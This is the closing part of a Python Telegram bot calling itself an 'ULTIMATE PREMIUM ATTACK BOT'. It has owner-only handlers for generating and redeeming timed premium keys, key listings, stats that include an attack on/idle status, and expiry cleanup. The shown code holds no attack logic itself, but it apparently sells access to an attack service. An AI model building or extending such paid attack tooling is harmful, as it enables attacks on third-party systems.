            f"🧹 _**Clear:**_ `/clearvideos`\n"
            f"{LINE}",
            reply_markup=back_admin_kb()
        )
        return
    
    # ═══════════ ADMIN MENU ═══════════
    if data == "admin_menu":
        if uid != OWNER_ID: await cb.answer("_**Owner only!**_", show_alert=True); return
        await cb.message.edit_text(
            f"👑 _**ADMIN PANEL**_\n\n{LINE}\n🔽 Select:",
            reply_markup=admin_kb()
        )
        return
    
    if data == "add_key_popup":
        if uid != OWNER_ID: return
        await cb.answer(
            "🪪 _**ADD KEY**_\n\n"
            "Use: `/genkey NAME TIME`\n\n"
            "📌 Examples:\n"
            "/genkey Test 30m\n"
            "/genkey VIP 24h\n"
            "/genkey Premium 7d\n"
            "/genkey Ultra 2w\n"
            "/genkey Legend 1mo\n\n"
            "⏱️ Units: m=min, h=hour, d=day, w=week, mo=month",
            show_alert=True
        )
        return
    
    if data == "auto_gen_key":
        if uid != OWNER_ID: return
        await cb.message.edit_text(
            f"🤖 _**AUTO GEN KEY**_\n\n{LINE}\n"
            f"🔽 _**Select Duration:**_\n"
            f"⏱️ _Click button to auto-generate!_",
            reply_markup=auto_gen_keyboard()
        )
        return
    
    # ═══════════ AUTO KEY GENERATION ═══════════
    auto_keys = {
        "autokey_20m": ("20min", "20m"),
        "autokey_40m": ("40min", "40m"),
        "autokey_60m": ("60min", "60m"),
        "autokey_1d": ("1day", "1d"),
        "autokey_3d": ("3day", "3d"),
        "autokey_7d": ("7day", "7d"),
        "autokey_15d": ("15day", "15d"),
        "autokey_23d": ("23day", "23d"),
        "autokey_30d": ("30day", "30d"),
        "autokey_1mo": ("1month", "1mo"),
        "autokey_2mo": ("2month", "2mo"),
        "autokey_3mo": ("3month", "3mo"),
    }
    
    if data in auto_keys:
        if uid != OWNER_ID: return
        name, time_str = auto_keys[data]
        key_code, duration = create_key(name, time_str)
        
        if key_code:
            text = f"""
🔑 _**KEY GENERATED!**_

{LINE}
🪪 _**Name:**_ `{name}`
⏱️ _**Duration:**_ `{duration}`
🔑 _**Key:**_ `{key_code}`
{LINE}

📋 _**User redeems:**_ `/redeem {key_code}`
"""
            await cb.message.edit_text(text, reply_markup=auto_gen_keyboard())
        else:
            await cb.answer("❌ Failed!", show_alert=True)
        return
    
    if data == "all_keys":
        if uid != OWNER_ID: return
        keys = get_keys()
        active = [k for k, v in keys.items() if v["active"] and not v.get("blocked")]
        used = [k for k, v in keys.items() if not v["active"] and not v.get("blocked")]
        
        text = f"🔑 _**ALL KEYS**_\n\n{LINE}\n"
        text += f"🟢 _**Active:**_ `{len(active)}`\n"
        text += f"🔴 _**Used:**_ `{len(used)}`\n"
        text += f"{LINE}\n\n"
        
        if active:
            text += "🟢 _**ACTIVE:**_\n"
            for k in active[:5]:
                v = keys[k]
                text += f"• `{k[:15]}...` - {v.get('duration_display', 'N/A')}\n"
        
        await cb.message.edit_text(text, reply_markup=back_admin_kb())
        return
    
    if data == "stats_btn":
        if uid != OWNER_ID: return
        vids = get_vids(); users = get_users()
        keys = get_keys()
        size = sum(os.path.getsize(v["path"]) for v in vids if os.path.exists(v["path"]))
        
        await cb.message.edit_text(
            f"📊 _**STATS**_\n\n{LINE}\n"
            f"📹 _**Videos:**_ `{len(vids)}` ({size/(1024*1024):.1f} MB)\n"
            f"💎 _**Premium:**_ `{len(users.get('premium', []))}`\n"
            f"🔑 _**Key Users:**_ `{len(users.get('keys', {}))}`\n"
            f"🟢 _**Active Keys:**_ `{len([k for k,v in keys.items() if v['active'] and not v.get('blocked')])}`\n"
            f"⚡ _**Attack:**_ {'🟢 On' if attacking else '💤 Idle'}\n"
            f"{LINE}",
            reply_markup=back_admin_kb()
        )
        return
    
    if data == "clear_expired":
        if uid != OWNER_ID: return
        removed = remove_expired()
        await cb.answer(f"🔄 {removed} expired removed!", show_alert=True)
        return

# ═══════════════ AUTO EXPIRE ═══════════════
async def auto_expire_checker():
    while True:
        await asyncio.sleep(300)
        removed = remove_expired()
        if removed > 0: logger.info(f"🔄 Removed {removed} expired")

# ═══════════════ INIT ═══════════════
for f, d in [(VIDEO_DB, []), (USERS_DB, {"premium": [], "keys": {}}), (KEYS_DB, {}), (BLOCKED_DB, []), (HISTORY_DB, {})]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)

loop = asyncio.get_event_loop()
loop.create_task(auto_expire_checker())

print(f"""
╔══════════════════════════════════════╗
║  💎 ULTIMATE PREMIUM ATTACK BOT 💎  ║
║  Auto Key | History | Premium UI    ║
╚══════════════════════════════════════╝
✅ Ready!
""")

if __name__ == "__main__":
    app.run()
